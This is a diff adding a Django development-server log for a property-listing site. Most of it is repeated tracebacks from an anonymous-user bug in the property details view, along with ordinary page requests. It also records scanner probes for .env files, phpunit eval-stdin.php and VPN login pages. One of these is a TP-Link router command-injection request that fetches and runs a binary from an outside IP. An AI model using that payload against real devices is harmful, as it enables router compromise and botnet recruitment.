+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1545, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1576, in _add_q
+    child_clause, needed_inner = self.build_filter(
+                                 ^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1491, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1318, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+             ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py", line 27, in __init__
+    self.rhs = self.get_prep_lookup()
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py", line 166, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2055, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x7fab24726d10>>.
+[28/Nov/2023 23:39:53] "GET /property/69AqZ/details/ HTTP/1.1" 500 127143
+Not Found: /request-contract/assets/imgs/
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py
+[28/Nov/2023 23:39:55] "GET /albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py HTTP/1.1" 404 4303
+[28/Nov/2023 23:39:55] "GET /request-contract/assets/imgs/ HTTP/1.1" 404 4153
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py
+[28/Nov/2023 23:39:55] "GET /albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py HTTP/1.1" 404 4297
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py
+[28/Nov/2023 23:39:55] "GET /albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py HTTP/1.1" 404 4282
+Not Found: /albdah-rebuild/albdah-rebuild/property/views.py
+[28/Nov/2023 23:39:56] "GET /albdah-rebuild/albdah-rebuild/property/views.py HTTP/1.1" 404 4207
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py
+[28/Nov/2023 23:39:57] "GET /albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py HTTP/1.1" 404 4324
+Not Found: /add-property-interface.html
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py
+[28/Nov/2023 23:39:57] "GET /albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py HTTP/1.1" 404 4279
+[28/Nov/2023 23:39:57] "GET /add-property-interface.html HTTP/1.1" 404 4147
+[28/Nov/2023 23:39:57] "GET /albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py HTTP/1.1" 404 4273
+[28/Nov/2023 23:39:57] "GET /albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py HTTP/1.1" 404 4279
+Not Found: /albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py
+[28/Nov/2023 23:39:57] "GET /albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py HTTP/1.1" 404 4285
+Not Found: /robots.txt
+[29/Nov/2023 00:07:06] "GET /robots.txt HTTP/1.1" 404 4096
+[29/Nov/2023 00:07:06] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 00:12:12] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+[29/Nov/2023 00:12:13] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[29/Nov/2023 00:12:13] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[29/Nov/2023 00:12:14] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[29/Nov/2023 00:28:46] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 00:30:22] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 00:32:44] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 00:32:44] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 00:46:42] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[29/Nov/2023 00:46:42] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[29/Nov/2023 00:46:43] "GET /static/js/maps/app.js HTTP/1.1" 200 3386
+[29/Nov/2023 01:23:06] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 01:39:56] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 01:39:56] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 02:08:05] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 02:27:42] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 02:36:08] "GET / HTTP/1.1" 200 13994
+Not Found: /form.html
+[29/Nov/2023 02:36:09] "GET /form.html HTTP/1.1" 404 4098
+Not Found: /upl.php
+[29/Nov/2023 02:36:09] "GET /upl.php HTTP/1.1" 404 4092
+Not Found: /geoip/
+[29/Nov/2023 02:36:09] "GET /geoip/ HTTP/1.1" 404 4089
+[29/Nov/2023 02:36:09] "GET / HTTP/1.1" 200 13994
+Not Found: /favicon.ico
+[29/Nov/2023 02:36:10] "GET /favicon.ico HTTP/1.1" 404 4104
+Not Found: /1.php
+[29/Nov/2023 02:36:10] "GET /1.php HTTP/1.1" 404 4086
+Not Found: /bundle.js
+[29/Nov/2023 02:36:10] "GET /bundle.js HTTP/1.1" 404 4098
+Not Found: /files/
+[29/Nov/2023 02:36:10] "GET /files/ HTTP/1.1" 404 4089
+Not Found: /systembc/password.php
+[29/Nov/2023 02:36:10] "GET /systembc/password.php HTTP/1.1" 404 4134
+Not Found: /password.php
+[29/Nov/2023 02:36:10] "GET /password.php HTTP/1.1" 404 4107
+Not Found: /info.php
+[29/Nov/2023 02:36:11] "GET /info.php HTTP/1.1" 404 4095
+[29/Nov/2023 03:15:17] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 03:22:42] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 03:31:00] "GET / HTTP/1.1" 200 13994
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 03:33:30] "CONNECT / HTTP/1.1" 403 3071
+[29/Nov/2023 03:44:20] "GET / HTTP/1.1" 200 13994
+Not Found: /+CSCOE+/logon.html
+[29/Nov/2023 03:44:22] "GET /+CSCOE+/logon.html HTTP/1.1" 404 4129
+Not Found: /vpn/index.html
+[29/Nov/2023 03:44:24] "GET /vpn/index.html HTTP/1.1" 404 4117
+Not Found: /global-protect/login.esp
+[29/Nov/2023 03:44:27] "GET /global-protect/login.esp HTTP/1.1" 404 4147
+[29/Nov/2023 03:56:45] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 04:00:46] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 04:00:46] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 04:03:30] "GET / HTTP/1.1" 200 13994
+Not Found: /autodiscover/autodiscover.json
+[29/Nov/2023 04:15:33] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 4177
+[29/Nov/2023 04:17:39] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 04:20:34] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 04:20:34] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 05:13:22] "GET / HTTP/1.1" 200 13994
+Not Found: /cgi-bin/luci/;stok=/locale
+[29/Nov/2023 05:31:14] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.146.26%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 4328
+Not Found: /.env
+[29/Nov/2023 05:36:22] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 05:36:22] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 06:17:55] "GET / HTTP/1.1" 200 13994
+/usr/lib/python3.11/statistics.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 28, 2023 - 16:56:42
+Django version 4.2.6, using settings 'project.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+
+Watching for file changes with StatReloader
+[29/Nov/2023 06:27:00] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 06:30:25] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 06:41:28] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 07:04:22] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 07:15:21] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 07:15:22] "POST / HTTP/1.1" 403 3071
+Not Found: /.env
+[29/Nov/2023 07:15:22] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 07:15:23] "POST / HTTP/1.1" 403 3071
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[29/Nov/2023 07:15:34] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 4221
+[29/Nov/2023 07:59:38] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 08:15:35] "GET / HTTP/1.1" 200 13994
+Not Found: /favicon.ico
+[29/Nov/2023 08:17:27] "GET /favicon.ico HTTP/1.1" 404 4104
+Not Found: /geoserver/web/
+[29/Nov/2023 08:18:13] "GET /geoserver/web/ HTTP/1.1" 404 4113
+[29/Nov/2023 08:21:32] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 09:01:29] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 09:01:29] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 09:16:50] "GET / HTTP/1.1" 200 13994
+Not Found: /manager/text/list
+[29/Nov/2023 09:22:10] "GET /manager/text/list HTTP/1.1" 404 4122
+[29/Nov/2023 09:26:08] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 09:55:34] "GET / HTTP/1.1" 200 13994
+Not Found: /favicon.ico
+[29/Nov/2023 10:04:02] "GET /favicon.ico HTTP/1.1" 404 4104
+[29/Nov/2023 10:06:22] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 10:06:33] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 10:09:48] "GET / HTTP/1.1" 200 13994
+Not Found: /geoserver/web/
+[29/Nov/2023 10:10:30] "GET /geoserver/web/ HTTP/1.1" 404 4113
+[29/Nov/2023 10:49:55] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 10:58:18] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 11:00:11] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 11:17:05] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 11:17:05] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 11:19:34] "GET / HTTP/1.1" 200 13994
+Not Found: /systembc/password.php
+[29/Nov/2023 11:32:09] "GET /systembc/password.php HTTP/1.1" 404 4133
+[29/Nov/2023 11:55:28] "GET / HTTP/1.1" 200 13994
+Not Found: /favicon.ico
+[29/Nov/2023 11:57:56] "GET /favicon.ico HTTP/1.1" 404 4103
+[29/Nov/2023 12:09:29] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 12:18:59] "GET /media/property/images/IMG_8325.jpg HTTP/1.1" 200 2415335
+Not Found: /dns-query
+[29/Nov/2023 12:47:26] "GET /dns-query?dns=XvABAAABAAAAAAAABmdvb2dsZQNjb20AAAEAAQ HTTP/1.1" 404 4141
+Not Found: /dns-query
+[29/Nov/2023 12:55:38] "POST /dns-query HTTP/1.1" 404 4099
+[29/Nov/2023 12:56:53] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 12:56:53] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+[29/Nov/2023 12:56:53] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[29/Nov/2023 12:56:53] "GET /static/imgs/logo.jpeg HTTP/1.1" 200 32248
+[29/Nov/2023 12:56:53] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 200 5115
+[29/Nov/2023 12:56:53] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[29/Nov/2023 12:56:53] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[29/Nov/2023 12:56:53] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 200 838594
+[29/Nov/2023 12:56:53] "GET /static/imgs/logo-transparent.png HTTP/1.1" 200 1465
+[29/Nov/2023 13:05:07] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 13:07:32] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:07:33] "GET /static/css/normalize.css HTTP/1.1" 304 0
+[29/Nov/2023 13:07:33] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[29/Nov/2023 13:07:35] "GET /static/imgs/logo.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:35] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 304 0
+[29/Nov/2023 13:07:36] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:36] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[29/Nov/2023 13:07:36] "GET /static/js/pages/app.js HTTP/1.1" 304 0
+[29/Nov/2023 13:07:36] "GET /static/imgs/logo-transparent.png HTTP/1.1" 304 0
+Not Found: /assets/imgs/logo.jpeg
+[29/Nov/2023 13:07:37] "GET /assets/imgs/logo.jpeg HTTP/1.1" 404 4133
+[29/Nov/2023 13:07:57] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM_1.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /static/css/property/property-details.css HTTP/1.1" 200 6559
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM_2.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_3.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_1.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_2.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM_2.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM_1.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:07:58] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.00_PM.jpeg HTTP/1.1" 304 0
+Not Found: /property/69AqZ/details/assets/imgs/logo.jpeg
+[29/Nov/2023 13:08:40] "GET /property/69AqZ/details/assets/imgs/logo.jpeg HTTP/1.1" 404 5529
+[29/Nov/2023 13:09:04] "GET /accounts/profile/ HTTP/1.1" 200 10322
+[29/Nov/2023 13:09:05] "GET /static/css/users/main.css HTTP/1.1" 304 0
+Not Found: /accounts/profile/assets/imgs/logo.jpeg
+[29/Nov/2023 13:09:06] "GET /accounts/profile/assets/imgs/logo.jpeg HTTP/1.1" 404 5721
+[29/Nov/2023 13:09:13] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[29/Nov/2023 13:09:14] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[29/Nov/2023 13:09:38] "GET /accounts/profile/ HTTP/1.1" 200 10322
+[29/Nov/2023 13:09:40] "GET /favourites/ HTTP/1.1" 200 8113
+Not Found: /favourites/assets/imgs/logo.jpeg
+[29/Nov/2023 13:09:40] "GET /favourites/assets/imgs/logo.jpeg HTTP/1.1" 404 4166
+[29/Nov/2023 13:09:45] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[29/Nov/2023 13:09:50] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:10:01] "GET /maps/search HTTP/1.1" 200 14763
+[29/Nov/2023 13:10:01] "GET /static/css/maps/style.css HTTP/1.1" 304 0
+Not Found: /maps/assets/imgs/logo.jpeg
+[29/Nov/2023 13:10:02] "GET /maps/assets/imgs/logo.jpeg HTTP/1.1" 404 4225
+[29/Nov/2023 13:11:33] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[29/Nov/2023 13:11:49] "GET /accounts/logout/ HTTP/1.1" 200 5925
+Not Found: /accounts/logout/assets/imgs/logo.jpeg
+[29/Nov/2023 13:11:50] "GET /accounts/logout/assets/imgs/logo.jpeg HTTP/1.1" 404 5718
+[29/Nov/2023 13:11:56] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 13:11:58] "GET /accounts/logout/ HTTP/1.1" 200 5925
+[29/Nov/2023 13:11:59] "GET /auth/ HTTP/1.1" 200 8277
+[29/Nov/2023 13:11:59] "GET /static/css/users/authenticate.css HTTP/1.1" 200 1296
+Not Found: /auth/assets/imgs/logo.jpeg
+[29/Nov/2023 13:12:00] "GET /auth/assets/imgs/logo.jpeg HTTP/1.1" 404 4148
+[29/Nov/2023 13:12:01] "GET / HTTP/1.1" 200 13994
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2053, in get_prep_value
+    return int(value)
+           ^^^^^^^^^^
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 623, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+                                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1436, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1454, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1461, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1545, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1576, in _add_q
+    child_clause, needed_inner = self.build_filter(
+                                 ^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1491, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1318, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+             ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py", line 27, in __init__
+    self.rhs = self.get_prep_lookup()
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py", line 166, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2055, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x7f3ea2aa82d0>>.
+[29/Nov/2023 13:12:05] "GET /property/69AqZ/details/ HTTP/1.1" 500 129930
+Not Found: /favicon.ico
+[29/Nov/2023 13:12:06] "GET /favicon.ico HTTP/1.1" 404 4103
+[29/Nov/2023 13:12:20] "GET /maps/search HTTP/1.1" 200 14747
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2053, in get_prep_value
+    return int(value)
+           ^^^^^^^^^^
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 623, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+                                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1436, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1454, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1461, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1545, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1576, in _add_q
+    child_clause, needed_inner = self.build_filter(
+                                 ^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1491, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1318, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+             ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py", line 27, in __init__
+    self.rhs = self.get_prep_lookup()
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py", line 166, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2055, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x7f3ea0145390>>.
+[29/Nov/2023 13:12:24] "GET /property/69AqZ/details/ HTTP/1.1" 500 129941
+[29/Nov/2023 13:14:06] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 13:14:15] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:14:16] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:14:16] "GET /static/css/normalize.css HTTP/1.1" 304 0
+[29/Nov/2023 13:14:16] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+[29/Nov/2023 13:14:16] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[29/Nov/2023 13:14:16] "GET /static/js/pages/app.js HTTP/1.1" 304 0
+[29/Nov/2023 13:14:16] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 304 0
+[29/Nov/2023 13:14:16] "GET /static/imgs/logo-transparent.png HTTP/1.1" 304 0
+[29/Nov/2023 13:14:16] "GET /static/imgs/logo.jpeg HTTP/1.1" 304 0
+[29/Nov/2023 13:14:17] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 304 0
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2053, in get_prep_value
+    return int(value)
+           ^^^^^^^^^^
+TypeError: int() argument must be a string, a bytes-like object or a real number, not 'SimpleLazyObject'
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 623, in get
+    clone = self._chain() if self.query.combinator else self.filter(*args, **kwargs)
+                                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1436, in filter
+    return self._filter_or_exclude(False, args, kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1454, in _filter_or_exclude
+    clone._filter_or_exclude_inplace(negate, args, kwargs)
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 1461, in _filter_or_exclude_inplace
+    self._query.add_q(Q(*args, **kwargs))
